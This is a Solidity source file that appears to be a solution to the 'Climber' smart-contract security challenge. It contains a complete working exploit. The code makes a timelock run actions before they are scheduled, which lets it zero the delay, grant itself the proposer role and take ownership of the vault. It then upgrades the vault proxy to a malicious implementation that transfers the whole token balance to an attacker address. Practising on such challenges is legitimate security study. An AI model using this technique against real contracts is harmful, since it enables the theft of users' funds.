// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberVault.sol";
import "./ClimberTimelock.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ClimberHack {
    constructor(
        address vault,
        address attacker,
        address tokenAddress
    ) {
        ClimberHack1 ch1 = new ClimberHack1(vault, attacker, tokenAddress);
        ch1.exploit();
        (bool succ, ) = vault.call(
            abi.encodeWithSignature(
                "getMonies(address,address)",
                tokenAddress,
                attacker
            )
        );
        require(succ, "get monies failed");
    }
}

contract ClimberHack1 {
    address _vault;
    address payable _owner;
    address _attacker;
    address _tokenAddress;

    address[] targets = new address[](4);
    uint256[] values = new uint256[](4);
    bytes[] dataElements = new bytes[](4);
    bytes32 salt = bytes32("aa");

    constructor(
        address vault,
        address attacker_,
        address tokenAddress_
    ) {
        _vault = vault;
        _attacker = attacker_;
        _tokenAddress = tokenAddress_;
        _owner = payable(ClimberVault(vault).owner());
    }

    function exploit() external {
        targets[0] = _owner;
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);

        targets[1] = _owner;
        dataElements[1] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            keccak256("PROPOSER_ROLE"),
            address(this)
        );

        targets[2] = address(this);
        dataElements[2] = abi.encodeWithSignature("scheduleZero()");

        targets[3] = _vault;
        dataElements[3] = abi.encodeWithSignature(
            "transferOwnership(address)",
            address(this)
        );

        ClimberTimelock(_owner).execute(targets, values, dataElements, salt);

        address cv2 = address(new ClimberVault2());
        (bool succ, ) = _vault.call(
            abi.encodeWithSignature("upgradeTo(address)", cv2)
        );
        require(succ, "upgrade fucking failed");
    }

    function scheduleZero() public {
        (bool res, ) = _owner.call(
            abi.encodeWithSignature(
                "schedule(address[],uint256[],bytes[],bytes32)",
                targets,
                values,
                dataElements,
                salt
            )
        );
        require(res, " failed to scheduel");
    }

    function bytesToAddress(bytes memory bys)
        public
        pure
        returns (address addr)
    {
        assembly {
            addr := mload(add(add(bys, 32), 0))
        }
    }
}

contract ClimberVault2 is ClimberVault {
    function getMonies(address tokenAddress, address receiver) public {
        IERC20 token = IERC20(tokenAddress);
        require(
            token.transfer(receiver, token.balanceOf(address(this))),
            "CV2 transfer failed"
        );
    }
}
